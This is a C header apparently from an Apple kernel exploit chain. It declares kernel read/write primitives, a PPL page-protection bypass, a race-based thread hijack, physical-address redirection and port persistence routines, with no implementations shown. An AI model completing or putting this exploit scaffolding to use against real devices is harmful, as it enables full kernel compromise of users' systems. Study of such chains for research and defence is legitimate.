#ifndef KERNEL_PRIMITIVES_H
#define KERNEL_PRIMITIVES_H

#include <stdint.h>
#include <stddef.h>
#include <mach/mach.h>
#include "kread_bootstrap.h"

typedef struct krw_worker_state krw_worker_state_t;

typedef struct {
    uint64_t mapped_addr;
    uint64_t map_size;
    uint64_t kobj_addr;
    uint32_t kobj_size;
    uint32_t ref_count;
    uint8_t  _pad[20];
    uint32_t entry_port;
} ppl_page_t;

extern krw_worker_state_t *g_krw_state;

void kwlog(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
void kwlog_raw(const void *buf, int len);
const char *kwrite_get_log(void);
void kwrite_set_ui_log_callback(void (*cb)(const char *line, int len));

kern_return_t kread_via_thread_state_impl(uint64_t kaddr, void *out, uint32_t size);
int kwrite_via_necp_object(uint64_t target_addr, const void *data,
        uint32_t size, int use_fd);
kern_return_t kwrite_buf(uint64_t kva, const void *buf, size_t len);

uint64_t kern_port_kobj_find_impl(uint32_t min_size, uint32_t *out_size,
        mach_port_t *out_port);

uint64_t resolve_port_to_ipc_port(mach_port_t port_name);
uint64_t ipc_port_get_kobject(uint64_t ipc_port_kva);
uint64_t ipc_object_resolve_deep(uint64_t kobject_kva);

int  ppl_make_writable_page(uint64_t target_pa, ppl_page_t *out);
void ppl_writable_page_free(ppl_page_t *page);

int kwrite_test(void);
int label372_setup(mach_port_t *out_port);
int ppl_race_thread_hijack(mach_port_t entry_port);
int init_kernel_rw_primitives(mach_port_t entry_port);
int post_init_setup(mach_port_t entry_port);
int port_persistence_setup(mach_port_t entry_port);
int kernel_rw_verify(mach_port_t entry_port);
int init_necp_kernel_handle(mach_port_t entry_port);

kern_return_t pa_redirect_write(uint8_t *groom, uint64_t pa_page, uint64_t *old_pa_out);
kern_return_t map_phys_page(uint32_t mem_entry, vm_address_t *addr_out);
void          pa_redirect_restore(uint8_t *groom, uint64_t old_pa);

typedef struct {
    uint64_t v177_kva, v173_kva;
    uint64_t v177_pa,  v173_pa;
    uint64_t v177_pa_orig;
    uint32_t v177_flags_orig;
    int valid;
} label372_orig_t;
int stab_get_label372_orig(label372_orig_t *out);

void necp_handle_teardown(void);
void krw_primitives_teardown(void);
void hijack_teardown(void);
void port_persistence_balance(void);

#endif
